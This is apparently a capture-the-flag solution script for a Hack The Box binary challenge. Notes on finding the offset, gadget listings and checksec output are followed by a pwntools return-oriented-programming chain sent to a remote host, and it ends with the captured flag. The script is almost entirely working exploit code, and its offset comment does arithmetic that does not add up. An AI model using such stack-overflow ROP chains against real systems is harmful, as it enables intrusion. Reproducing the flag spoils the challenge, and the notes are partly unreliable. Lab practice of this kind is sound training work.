'''
cyclic 1024
gdb ./rocket_blaster_xxx
rbp -> 'jaaajaaa'

cyclic -l iaaajaaa
32

offset = 32+8+8 == 40

ROPgadget --binary rocket_blaster_xxx|grep pop
0x000000000040125b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401256 : mov byte ptr [rip + 0x3dcb], 1 ; pop rbp ; ret
0x00000000004012f2 : nop ; pop rbp ; ret
0x000000000040125d : pop rbp ; ret
0x000000000040159f : pop rdi ; ret
0x000000000040159b : pop rdx ; ret
0x00000000004013ae : pop rsi ; or al, 0 ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x000000000040159d : pop rsi ; ret

checksec --file  rocket_blaster_xxx
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

'''

from pwn import *

offset = 40

#io = process('./rocket_blaster_xxx')
ip, port = '83.136.254.177', 58478
io = remote(ip, port)

pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b

ret_addr = 0x04012f5

#16 bytes alignment ??
ret = 0x401586 #0x0000000000401586 : add cl, cl ; ret

payload = offset*b'A' + p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi) + p64(0xdeadbabe) + p64(pop_rdx) + p64(0xdead1337) + p64(ret_addr)
io.recvuntil(">> ")
io.sendline(payload)
io.interactive()

#HTB{b00m_b00m_b00m_3_r0ck3t5_t0_th3_m00n}
